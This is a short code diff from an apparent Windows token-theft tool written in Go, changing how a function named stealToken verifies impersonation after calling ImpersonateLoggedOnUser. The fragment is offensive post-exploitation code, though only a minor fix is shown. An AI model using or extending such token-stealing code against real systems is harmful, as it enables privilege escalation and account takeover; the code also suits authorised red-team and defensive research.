@@ -230,12 +230,12 @@ func stealToken(pid uint32) (string, error) {
 		return output, fmt.Errorf("ImpersonateLoggedOnUser failed: %v", err)
 	}
 
-	// Verify impersonation by checking thread token
+	// Verify impersonation by checking thread token (openAsSelf=true to check from process context)
 	var hThreadToken windows.Token
 	err = windows.OpenThreadToken(
 		windows.CurrentThread(),
 		windows.TOKEN_QUERY,
-		false,
+		true,
 		&hThreadToken,
 	)
 	if err != nil {
